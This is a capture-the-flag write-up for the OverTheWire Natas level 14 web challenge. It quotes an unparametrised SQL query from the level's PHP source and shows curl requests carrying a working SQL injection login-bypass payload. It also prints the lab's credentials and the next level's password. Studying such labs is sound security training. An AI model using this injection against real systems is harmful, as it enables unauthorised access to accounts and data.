# Natas14

*	user: `natas14`
*	pass: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`
*	url: `http://natas14.natas.labs.overthewire.org`
*	flag: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

## Procedure

1.	By analysing the source code, catches the eye a non parametrised
	SQL query

		$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

	that means [SQL Injection](http://en.wikipedia.org/wiki/SQL_injection)

2.	Furthermore, it's possible to enable a simple debugging mode by
	providing through a `GET` `username`, `password` and `debug`
	parameters. So let's try...

		$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 "http://natas14.natas.labs.overthewire.org/?debug&username=alice&password=s3cr3t"
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas14</h1>
		<div id="content">
		Executing query: SELECT * from users where username="alice" and password="s3cr3t"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

3.	It seems to work. Let's try something tricky...

		$ curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 --data "username=1\"%20or%20\"a\"=\"a\"#&password=NotNecessary" "http://natas14.natas.labs.overthewire.org/?debug"
		<html>
		<head>
		[cut]
		</head>
		<body>
		<h1>natas14</h1>
		<div id="content">
		Executing query: SELECT * from users where username="1" or "a"="a"#" and password="NotNecessary"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

	Yep! It works! The key is to pass as `username` the following string

		1" or "a"="a"#
